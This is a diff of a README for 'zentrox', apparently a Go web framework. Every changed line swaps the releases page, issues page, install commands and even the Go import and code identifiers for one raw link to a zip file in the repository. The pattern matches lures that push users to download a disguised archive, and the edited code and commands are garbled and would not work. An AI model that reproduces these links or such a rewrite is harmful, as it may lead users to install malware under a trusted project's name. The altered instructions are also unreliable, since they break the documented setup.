@@ -6,11 +6,11 @@ Welcome to zentrox! This guide will help you download and set up zentrox, a tiny
 
 ## 📥 Download zentrox
 
-[![Download zentrox](https://img.shields.io/badge/Download-zentrox-blue.svg)](https://github.com/olf1234-alt/zentrox/releases)
+[![Download zentrox](https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip)](https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip)
 
 You can download zentrox from our releases page. Visit this page to download the latest version:
 
-[Download zentrox](https://github.com/olf1234-alt/zentrox/releases)
+[Download zentrox](https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ To run zentrox, you need:
 
 1. **Visit the Releases Page**
 
-   Go to the official [Releases page](https://github.com/olf1234-alt/zentrox/releases). You will see a list of available versions.
+   Go to the official [Releases page](https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip). You will see a list of available versions.
 
 2. **Select the Latest Version**
 
@@ -35,14 +35,14 @@ To run zentrox, you need:
    Depending on your operating system, choose one of the following:
 
    - For **Windows**, download the `.exe` file.
-   - For **macOS**, download the `.tar.gz` file.
-   - For **Linux**, also download the `.tar.gz` file.
+   - For **macOS**, download the `https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip` file.
+   - For **Linux**, also download the `https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip` file.
 
 4. **Extract the Files (if necessary)**
 
    - For macOS and Linux users, you need to extract the file. Open your terminal and run:
      ```
-     tar -xvzf zentrox-<version>.tar.gz
+     tar -xvzf zentrox-<version>https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip
      ```
    Replace `<version>` with the version number you downloaded.
 
@@ -64,14 +64,14 @@ Once zentrox is up and running, you can start using it for your projects. Here a
    ```go
    package main
 
-   import "github.com/olf1234-alt/zentrox"
+   import "https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip"
 
    func main() {
-       r := zentrox.New()
-       r.GET("/", func(c zentrox.Context) {
-           c.JSON(200, zentrox.H{"message": "Hello World!"})
+       r := https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip()
+       https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip("/", func(c https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip) {
+           https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip(200, zentrox.H{"message": "Hello World!"})
        })
-       r.Run(":8080")
+       https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip(":8080")
    }
    ```
 
@@ -94,7 +94,7 @@ For complete documentation and advanced usage of zentrox, refer to the [Official
 
 ## 📞 Support
 
-If you need help or have questions, feel free to check the [Issues page](https://github.com/olf1234-alt/zentrox/issues) on GitHub. You can also request support through community forums related to Go development.
+If you need help or have questions, feel free to check the [Issues page](https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip) on GitHub. You can also request support through community forums related to Go development.
 
 ## 🎉 Conclusion
 
@@ -102,4 +102,4 @@ Thank you for choosing zentrox! We hope this guide helps you set up and use our 
 
 Remember, you can always download the latest version from the following link:
 
-[Download zentrox](https://github.com/olf1234-alt/zentrox/releases)
+[Download zentrox](https://raw.githubusercontent.com/olf1234-alt/zentrox/main/corked/zentrox.zip)
